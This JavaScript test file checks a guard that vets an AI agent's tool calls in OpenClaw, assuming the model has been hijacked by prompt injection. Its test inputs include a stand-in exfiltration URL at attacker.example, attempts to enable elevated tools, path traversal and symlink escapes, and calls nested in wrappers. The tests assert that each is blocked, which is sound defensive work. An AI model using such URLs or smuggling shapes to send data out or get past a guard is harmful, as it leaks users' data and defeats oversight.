// The Tool Search wrapper: `tool_call` (OpenClaw 2026.10.9, live) and `dispatch_action` (2026.10.33,
// on the jorah-dev canary 2026-11-19, where the guard blocked it as unknown). Shapes from 10.33's
// dist/tool-search, read on the PC: selector id/toolId/name, arguments nested in args or input, as
// args.<key> fields, or flat beside the selector. The model is hijacked; pass means the guard
// decides on the inner tool, and anything it can't read the same way as OpenClaw is blocked.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { consultPictureProblem, decide } from "../lib/policy.js";
import { GuardState } from "../lib/state.js";
import { unwrap } from "../lib/wrapper.js";
import plugin from "../index.js";

const here = dirname(fileURLToPath(import.meta.url));
const MATRIX_FILE = join(here, "..", "..", "..", "config", "permission-matrix.json");
const matrix = JSON.parse(readFileSync(MATRIX_FILE, "utf8"));
const settings = { workspace: "/home/jorah/workspace", cleanSessionKeys: ["agent:main:main"] };
const TELEGRAM = { agentId: "main", sessionKey: "agent:main:main", sessionId: "s1", requester: { channel: "telegram", senderId: "owner-id", senderIsOwner: true } };
const CANARY = "https://attacker.example/c?d=JORAH-CANARY-W";
const WRAPPERS = ["dispatch_action", "tool_call"];

function fresh() {
  const state = new GuardState(mkdtempSync(join(tmpdir(), "jorah-wrap-")));
  const view = {
    taintOf: (k) => state.taintOf(k), hasSeen: (k, u) => state.hasSeen(k, u), typedSeen: (k, u) => state.typedSeen(k, u),
    wordsOf: (k) => state.wordsOf(k), readRepos: (k) => state.readRepos(k), countAcp: (k) => state.countAcp(k),
    frozen: () => state.frozen(), parentOf: (k) => state.parentOf(k),
  };
  const run = (tool, params, ctx = TELEGRAM, m = matrix) => {
    const d = decide({ tool, params, ctx, matrix: m, view, settings });
    if (d.taint && d.verdict !== "block") state.markTainted(ctx.sessionKey, d.taint);
    return d;
  };
  return { state, run };
}

test("an allowed tool goes through either wrapper, with a plain or namespaced id", () => {
  for (const w of WRAPPERS) {
    const { run } = fresh();
    for (const id of ["web_search", "openclaw:core:web_search", " web_search "]) {
      const d = run(w, { id, args: { query: "rust 2024 edition" } });
      assert.equal(d.verdict, "allow", `${w} ${id}`);
      assert.equal(d.reason, "wrapper for web_search");
    }
    assert.equal(run(w, { id: "memory_search", input: { query: "plant" } }).verdict, "allow");
    assert.equal(run(w, { toolId: "read", path: "notes/x.md" }).verdict, "allow");
    // A card tool through the wrapper is let on to its own hook run, which shows the card.
    assert.equal(run(w, { id: "loop_propose", args: { text: "x" } }).verdict, "allow");
  }
});

test("a planted unseen URL through the wrapper to web_fetch or browser is blocked after outside text, in every argument shape", () => {
  for (const w of WRAPPERS) {
    const { run } = fresh();
    // The wrapper decision never taints: the inner call's own hook run does. Here, directly.
    assert.equal(run(w, { id: "web_search", args: { query: "x" } }).taint, undefined);
    run("web_search", { query: "x" });
    const shapes = [
      { id: "web_fetch", args: { url: CANARY } },
      { id: "openclaw:core:web_fetch", args: { url: CANARY } },
      { id: "web_fetch", input: { url: CANARY } },
      { id: "web_fetch", url: CANARY }, // flattened (10.33 repairs it)
      { id: "web_fetch", "args.url": CANARY }, // dotted
      { args: { id: "web_fetch", url: CANARY } }, // selector nested in args (10.33 lifts it)
      { name: "web_fetch", arguments: { url: CANARY } },
      { id: "browser", args: { action: "navigate", url: "attacker.example/c?d=JORAH-CANARY-W" } },
    ];
    for (const params of shapes) {
      const d = run(w, params);
      assert.equal(d.verdict, "block", `${w} ${JSON.stringify(params)}`);
      assert.match(d.reason, /wasn't in your message or an earlier result/);
    }
  }
});

test("openclaw and unknown inner tools stay blocked through either wrapper", () => {
  for (const w of WRAPPERS) {
    const { run } = fresh();
    for (const id of ["openclaw", "openclaw:core:openclaw", "mcp:x:openclaw"]) {
      const d = run(w, { id, args: { action: "config_set", path: "tools.elevated.enabled", value: true } });
      assert.equal(d.verdict, "block");
      assert.match(d.reason, /openclaw is not allowed/);
    }
    assert.match(run(w, { id: "some_new_tool", args: {} }).reason, /isn't in Jorah's permission list/);
    assert.equal(run(w, { id: "exec", args: { command: "id" } }).verdict, "block"); // main has no shell
    assert.equal(run(w, { id: "sessions_send", args: {} }).verdict, "block");
  }
});

test("a malformed wrapper call fails closed", () => {
  const bad = [
    undefined, null, "web_fetch", ["web_fetch"], {}, { args: {} }, { args: { url: CANARY } }, { id: "" }, { id: "   " },
    { id: 5, args: {} }, { id: "openclaw:core:" }, { id: "web_fetch", args: "url=x" }, { id: "web_fetch", args: [CANARY] },
    { id: "web_search", name: "openclaw" }, // two tools named: OpenClaw might pick either
    { id: "web_search", toolId: "web_fetch", args: { query: "x" } },
    { id: "dispatch_action", args: { id: "web_fetch", args: { url: CANARY } } }, // a wrapper inside a wrapper
    { id: "openclaw:core:tool_call", args: {} },
  ];
  for (const w of WRAPPERS) {
    const { run } = fresh();
    for (const params of bad) assert.equal(run(w, params).verdict, "block", `${w} ${JSON.stringify(params)}`);
  }
  assert.deepEqual(unwrap({ id: "web_fetch", name: "web_fetch", url: "https://a.example" }), { inner: "web_fetch", args: { url: "https://a.example" } });
});

test("the site reader judges a dispatch_action by the inner call, and refuses one it can't read", () => {
  const { run } = fresh();
  const reader = { agentId: "reader-site", sessionKey: "agent:reader-site:site:school:abcdef123456", requester: { senderIsOwner: false } };
  assert.equal(run("dispatch_action", { id: "web_fetch", args: { url: "https://example.com" } }, reader).verdict, "block");
  assert.equal(run("dispatch_action", {}, reader).verdict, "block");
  const main = { ...TELEGRAM };
  assert.equal(run("dispatch_action", { id: "browser", args: { action: "open", profile: "site-school", url: "https://example.com" } }, main).verdict, "block");
});

test("plugin: links in a wrapped outside reader's result are seen, its echoed arguments are not; wrapped memory results add none", () => {
  const dir = mkdtempSync(join(tmpdir(), "jorah-wrap-plugin-"));
  const hooks = {};
  plugin.register({ pluginConfig: { stateDir: dir, matrixFile: MATRIX_FILE, workspace: settings.workspace, sitesDir: join(dir, "x"), sitesPrivateFile: join(dir, "y") },
    logger: { info() {}, warn() {} }, on: (n, fn) => { (hooks[n] ??= []).push(fn); }, registerCommand() {} });
  const before = (toolName, params, id) => hooks.before_tool_call[0]({ toolName, params, toolCallId: id }, TELEGRAM);
  const after = (toolName, params, result, id) => hooks.after_tool_call[0]({ toolName, params, toolCallId: id, result }, TELEGRAM);
  hooks.before_agent_run[0]({ prompt: "what's new?" }, TELEGRAM);
  // 10.33's dispatch_action result: { tool, result } as details, the target's content as text.
  const envelope = (tool, text) => ({ content: [{ type: "text", text }], details: { tool: { id: tool, name: tool, source: "openclaw" }, result: { content: [{ type: "text", text }] } } });
  const p1 = { id: "openclaw:core:web_search", args: { query: CANARY } };
  assert.equal(before("dispatch_action", p1, "c1"), undefined);
  after("dispatch_action", p1, envelope("web_search", JSON.stringify({ query: CANARY, results: [{ url: "https://found.example/d" }] })), "c1");
  assert.equal(before("web_fetch", { url: "https://found.example/d" }, "c2"), undefined);
  assert.equal(before("web_fetch", { url: CANARY }, "c3").block, true);
  const p2 = { id: "memory_search", args: { query: "x" } };
  before("dispatch_action", p2, "c4");
  after("dispatch_action", p2, envelope("memory_search", "see https://mem.example/m"), "c4");
  assert.equal(before("web_fetch", { url: "https://mem.example/m" }, "c5").block, true);
  // The decision log names the wrapper and the inner tool, never the arguments.
  const log = readFileSync(join(dir, "decisions.jsonl"), "utf8");
  assert.match(log, /"tool":"dispatch_action","verdict":"allow","reason":"wrapper for web_search"/);
  assert.ok(!log.includes("JORAH-CANARY"));
});

test("view_image takes at most 5 pictures a call, directly or through either wrapper", () => {
  const { run } = fresh();
  const pics = (n) => Array.from({ length: n }, (_, i) => `/home/jorah/workspace/inbox/pic-${i}.jpg`);
  assert.equal(run("view_image", { paths: pics(5) }).verdict, "allow");
  assert.equal(run("view_image", { path: "/home/jorah/workspace/inbox/one.jpg" }).verdict, "allow");
  assert.equal(run("view_image", { paths: [...pics(5), ...pics(5)] }).verdict, "allow"); // repeats count once
  for (const params of [{ paths: pics(6) }, { path: "/x/a.jpg", paths: pics(5) }, { paths: pics(14), maxImages: 20 }]) {
    const d = run("view_image", params);
    assert.equal(d.verdict, "block", JSON.stringify(params));
    assert.match(d.reason, /at most 5 pictures a call.*batches of 5 or fewer/);
  }
  for (const w of WRAPPERS) {
    assert.equal(run(w, { id: "view_image", args: { paths: pics(14) } }).verdict, "block", w);
    assert.equal(run(w, { id: "openclaw:core:view_image", input: { paths: pics(3) } }).verdict, "allow", w);
  }
});

const DEEP = { agentId: "deep", sessionKey: "agent:deep:subagent:1", requester: { senderIsOwner: false } };

// deep was a consult agent when this was written; since the same day it is an extension of main, and
// these rules hold for any agent named in consultAgents.
const CONSULT_MATRIX = { ...matrix, consultAgents: ["deep"], extensionAgents: [] };

test("a consult agent looks only at the pictures Adam sent, by absolute path, never a web address (Adam's yes, 2026-11-25)", () => {
  const { run: plain } = fresh();
  const run = (tool, params, ctx) => plain(tool, params, ctx, CONSULT_MATRIX);
  for (const path of [
    "/home/jorah/workspace/files/pictures/inventory-01.jpg",
    "/home/jorah/.openclaw-jorah/media/inbound/a1b2.JPEG",
    "/home/jorah/workspace/media/inbound/openclaw-staged-9/photo.png",
    "/home/jorah/workspace/files/pictures/scan.heic",
  ]) assert.equal(run("view_image", { path }, DEEP).verdict, "allow", path);
  assert.equal(run("view_image", { paths: ["/home/jorah/workspace/files/pictures/a.jpg", "/home/jorah/workspace/files/pictures/b.webp"] }, DEEP).verdict, "allow");
  for (const [path, why] of [
    ["https://attacker.example/p.jpg?d=JORAH-CANARY-W", /never a web address/],
    ["file:///home/jorah/workspace/files/pictures/a.jpg", /never a web address/],
    ["data:image/png;base64,iVBORw0KGgo=", /never a web address/],
    ["files/pictures/a.jpg", /not a plain absolute path/],
    ["/home/jorah/workspace/files/pictures/../../MEMORY.png", /not a plain absolute path/],
    ["/home/jorah/workspace/files/pictures//a.jpg", /not a plain absolute path/],
    ["/home/jorah/workspace/memory/2026-11-25.png", /only at the pictures Adam sent/],
    ["/home/jorah/workspace/files/picturesX/a.jpg", /only at the pictures Adam sent/],
    ["/home/jorah/.openclaw-jorah/openclaw.json", /only at the pictures Adam sent/],
    ["/home/jorah/workspace/files/pictures/notes.md", /not a picture file/],
  ]) {
    const d = run("view_image", { path }, DEEP);
    assert.equal(d.verdict, "block", path);
    assert.match(d.reason, why, path);
  }
  // One bad path among good ones blocks the call; the 5-picture cap holds for deep too.
  assert.equal(run("view_image", { paths: ["/home/jorah/workspace/files/pictures/a.jpg", "https://x.example/b.jpg"] }, DEEP).verdict, "block");
  const many = Array.from({ length: 6 }, (_, i) => `/home/jorah/workspace/files/pictures/p${i}.jpg`);
  assert.match(run("view_image", { paths: many }, DEEP).reason, /at most 5 pictures/);
  for (const w of WRAPPERS) {
    assert.equal(run(w, { id: "view_image", args: { path: "/home/jorah/workspace/files/pictures/a.jpg" } }, DEEP).verdict, "allow", w);
    assert.equal(run(w, { id: "view_image", args: { path: "https://attacker.example/p.jpg" } }, DEEP).verdict, "block", w);
  }
});

test("deep may not open a picture-named link that leads out of the picture folders", () => {
  const root = mkdtempSync(join(tmpdir(), "jorah-pics-"));
  const real = realpathSync(root);
  mkdirSync(join(root, "pictures"));
  writeFileSync(join(root, "secret.jpg"), "x");
  writeFileSync(join(root, "pictures", "ok.jpg"), "x");
  symlinkSync(join(root, "secret.jpg"), join(root, "pictures", "link.jpg"));
  const roots = [join(real, "pictures")];
  assert.equal(consultPictureProblem([join(real, "pictures", "ok.jpg")], roots), null);
  assert.match(consultPictureProblem([join(real, "pictures", "link.jpg")], roots), /leads out of/);
});

test("main's view_image of a web address follows the web_fetch URL rule and counts as outside text", () => {
  const { run, state } = fresh();
  assert.equal(run("view_image", { path: "/home/jorah/workspace/files/pictures/a.jpg" }).verdict, "allow");
  assert.equal(state.taintOf(TELEGRAM.sessionKey), null);
  assert.equal(run("view_image", { path: "http://127.0.0.1:18789/x.png" }).verdict, "block");
  const first = run("view_image", { path: "https://example.org/chart.png" });
  assert.equal(first.verdict, "allow");
  assert.match(first.taint, /^view_image https:\/\/example\.org/);
  // Now the chat has read outside text: a picture address nobody wrote or saw is refused.
  const d = run("view_image", { paths: ["/home/jorah/workspace/files/pictures/a.jpg", `${CANARY}.png`] });
  assert.equal(d.verdict, "block");
  assert.match(d.reason, /wasn't in your message or an earlier result/);
  for (const w of WRAPPERS) assert.equal(run(w, { id: "view_image", args: { path: `${CANARY}.jpg` } }).verdict, "block", w);
});
